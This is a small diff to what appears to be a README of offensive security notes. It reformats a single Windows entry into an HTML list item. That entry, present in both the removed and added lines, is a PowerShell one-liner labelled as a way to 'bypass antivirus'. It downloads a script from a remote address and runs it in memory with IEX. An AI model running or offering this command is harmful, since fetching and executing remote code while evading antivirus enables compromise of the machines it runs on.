@@ -11,4 +11,6 @@ few scripts and useful commands
 </ul>
 
 # windows
-run ps1 script in memory (bypass antivirus) : powershell IEX (New-Object Net.WebClient).DownloadString('http://10.133.127.172:85/test.ps1')
+<ul>
+<li>run ps1 script in memory (bypass antivirus) : powershell IEX (New-Object Net.WebClient).DownloadString('http://10.133.127.172:85/test.ps1')</li>
+</ul>
